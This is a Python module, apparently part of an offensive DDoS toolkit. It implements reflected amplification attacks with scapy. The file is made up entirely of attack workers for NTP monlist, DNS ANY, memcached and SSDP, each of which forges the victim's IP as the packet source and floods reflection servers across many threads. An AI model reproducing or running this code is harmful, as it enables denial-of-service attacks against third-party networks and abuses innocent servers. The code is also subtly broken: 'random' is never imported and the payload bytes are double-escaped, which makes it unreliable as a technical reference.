import threading
import time
from scapy.all import IP, UDP, send, raw
from core.colors import log_info, log_success, log_warning, log_danger

class Amplification:
    def __init__(self, target_ip, reflection_servers_file, threads=100, time=300):
        self.target_ip = target_ip
        self.reflection_servers = self.load_servers(reflection_servers_file)
        self.threads = threads
        self.time = time

    def load_servers(self, filename):
        servers = []
        try:
            with open(filename, "r") as f:
                servers = [line.strip() for line in f if line.strip()]
        except Exception:
            pass
        return servers

    def ntp_worker(self):
        # The NTP monlist command payload (magic bytes)
        payload = b'\\x17\\x00\\x03\\x2a\\x00\\x00\\x00\\x00'
        end_time = time.time() + self.time
        
        while time.time() < end_time:
            try:
                server = random.choice(self.reflection_servers)
                
                # Spoof source IP to be the Target IP, destination is the NTP Server
                ip_layer = IP(src=self.target_ip, dst=server)
                udp_layer = UDP(sport=random.randint(1024, 65535), dport=123)
                packet = ip_layer / udp_layer / payload
                
                send(packet, verbose=False)
            except Exception:
                pass

    def dns_worker(self):
        # A DNS query for 'ANY' record of a large zone (e.g., isc.org) to maximize response size
        # EDNS0 enabled for large UDP payloads
        from scapy.all import DNS, DNSQR
        end_time = time.time() + self.time
        
        while time.time() < end_time:
            try:
                server = random.choice(self.reflection_servers)
                
                ip_layer = IP(src=self.target_ip, dst=server)
                udp_layer = UDP(sport=random.randint(1024, 65535), dport=53)
                dns_layer = DNS(rd=1, qd=DNSQR(qname="isc.org", qtype="ANY", qclass="IN"))
                packet = ip_layer / udp_layer / dns_layer
                
                send(packet, verbose=False)
            except Exception:
                pass

    def memcached_worker(self):
        # Memcached amplification payload
        payload = b'\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00stats\\r\\n'
        end_time = time.time() + self.time
        
        while time.time() < end_time:
            try:
                server = random.choice(self.reflection_servers)
                ip_layer = IP(src=self.target_ip, dst=server)
                udp_layer = UDP(sport=random.randint(1024, 65535), dport=11211)
                packet = ip_layer / udp_layer / payload
                send(packet, verbose=False)
            except Exception:
                pass

    def ssdp_worker(self):
        # UPnP SSDP amplification payload
        payload = b'M-SEARCH * HTTP/1.1\\r\\nHost: 239.255.255.250:1900\\r\\nMan: "ssdp:discover"\\r\\nMX: 2\\r\\nST: ssdp:all\\r\\n\\r\\n'
        end_time = time.time() + self.time
        
        while time.time() < end_time:
            try:
                server = random.choice(self.reflection_servers)
                ip_layer = IP(src=self.target_ip, dst=server)
                udp_layer = UDP(sport=random.randint(1024, 65535), dport=1900)
                packet = ip_layer / udp_layer / payload
                send(packet, verbose=False)
            except Exception:
                pass

    def run_method(self, method="NTP"):
        if not self.reflection_servers:
            log_danger(f"No reflection servers loaded for {method}. Aborting.")
            return

        log_info(f"Starting {method} Amplification on {self.target_ip} with {self.threads} threads...")
        threads = []
        target_func = None
        
        if method == "NTP": target_func = self.ntp_worker
        elif method == "DNS": target_func = self.dns_worker
        elif method == "MEMCACHED": target_func = self.memcached_worker
        elif method == "SSDP": target_func = self.ssdp_worker
        
        if target_func:
            for _ in range(self.threads):
                t = threading.Thread(target=target_func)
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()
            log_success(f"{method} Amplification Finished.")
